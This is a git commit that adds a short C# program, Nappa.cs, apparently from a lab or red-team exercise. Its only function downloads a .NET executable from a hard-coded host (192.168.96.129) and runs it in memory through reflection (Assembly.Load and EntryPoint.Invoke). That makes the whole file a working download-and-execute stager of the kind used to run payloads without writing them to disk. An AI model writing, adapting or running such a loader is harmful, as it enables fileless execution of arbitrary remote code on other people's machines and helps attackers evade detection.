ce66ba21a799281551fde0d463af20c6e804e7c2
Jongtek-23 <72738269+Jongtek-23@users.noreply.github.com>
2022-04-19 09:00:10 +0200

    Add files via upload

---
+++ Nappa.cs
@@ -0,0 +1,23 @@
+﻿using System;
+using System.Reflection;
+using System.Net;
+
+namespace Nappa
+{
+    internal class Program
+    {
+        static void ReflectionFromWeb(string url)
+        {
+            WebClient client = new WebClient();
+            byte[] programBytes = client.DownloadData(url);
+            Assembly dotnetProgram = Assembly.Load(programBytes);
+            object[] parameters = new string[] { null };
+            dotnetProgram.EntryPoint.Invoke(null, parameters);
+        }
+
+        static void Main(string[] args)
+        {
+            ReflectionFromWeb("http://192.168.96.129/HelloReflectionWorld.exe");
+        }
+    }
+}
